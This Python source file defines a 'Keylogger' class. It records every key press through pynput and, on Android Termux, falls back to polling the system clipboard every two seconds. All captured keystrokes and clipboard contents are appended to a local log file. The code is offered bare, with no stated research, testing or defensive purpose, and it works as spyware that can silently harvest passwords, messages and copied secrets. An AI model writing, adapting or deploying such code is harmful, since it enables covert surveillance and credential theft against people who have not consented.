import os
import time
import threading
import queue
import subprocess

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

class Keylogger:
    def __init__(self, log_file='keylog.txt'):
        self.log_file = log_file
        self.buffer = []
        self.running = False
        self.queue = queue.Queue()
        self.listener = None

    def start(self):
        if self.running:
            return
        self.running = True
        if PYNPUT_AVAILABLE and os.name != 'posix':
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()
        else:
            threading.Thread(target=self._clipboard_monitor, daemon=True).start()

    def stop(self):
        self.running = False
        if self.listener:
            self.listener.stop()

    def _on_press(self, key):
        try:
            char = key.char
            if char:
                self.queue.put(char)
        except AttributeError:
            self.queue.put(f'<{key}>')

    def _clipboard_monitor(self):
        last = ""
        while self.running:
            try:
                if os.path.exists('/data/data/com.termux/files/usr/bin/termux-clipboard-get'):
                    current = subprocess.check_output(['termux-clipboard-get'], text=True).strip()
                else:
                    current = ""
                if current and current != last:
                    self.queue.put(f"[CLIPBOARD] {current}")
                    last = current
            except:
                pass
            time.sleep(2)

    def get_logs(self):
        logs = []
        while not self.queue.empty():
            logs.append(self.queue.get())
        return ''.join(logs)

    def flush(self):
        logs = self.get_logs()
        if logs:
            with open(self.log_file, 'a') as f:
                f.write(logs + '\n')
        return logs